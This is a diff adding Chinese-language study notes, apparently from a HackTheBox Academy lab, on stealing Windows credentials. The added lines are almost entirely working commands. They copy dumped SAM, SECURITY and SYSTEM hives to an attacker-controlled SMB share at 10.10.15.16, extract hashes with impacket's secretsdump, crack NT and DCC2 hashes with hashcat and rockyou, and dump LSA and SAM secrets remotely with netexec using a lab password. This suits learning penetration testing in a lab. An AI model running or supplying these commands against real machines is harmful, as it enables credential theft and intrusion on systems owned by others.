@@ -172,6 +172,33 @@ C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save
 
 C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save
 
+使用 smbserver.py 转移凭证
+  https://github.com/fortra/impacket/blob/master/examples/smbserver.py
+
+sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/      在攻击机建立共享
+
+C:\> move sam.save \\10.10.15.16\CompData      转移去攻击机
+
+C:\> move security.save \\10.10.15.16\CompData
+
+C:\> move system.save \\10.10.15.16\CompData
+
+locate secretsdump      找 secretsdump 目录
+python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL      从凭证解析出哈希
+
+手动把 samhashes 或 nthashes 哈希放入 hashestocrack.txt
+cut -d ':' -f 4 samhashes.txt > nthashes.txt      从 samhashes 裁剪 nthashes
+sudo hashcat -m 1000 nthashes.txt /usr/share/wordlists/rockyou.txt      破解哈希
+
+
+hashcat -m 2100 '$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25' /usr/share/wordlists/rockyou.txt      破解 security.save 的 DCC2 哈希
+
+DPAPI  (Data Protection Application Programming Interface) 的机器和用户自动填充密钥也从 hklm\security 中被转储
+用 mimikatz.exe 破解
+
+netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
+netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam            相当于 smbserver.py 转移凭证 加 解析出哈希
+
 
 
 
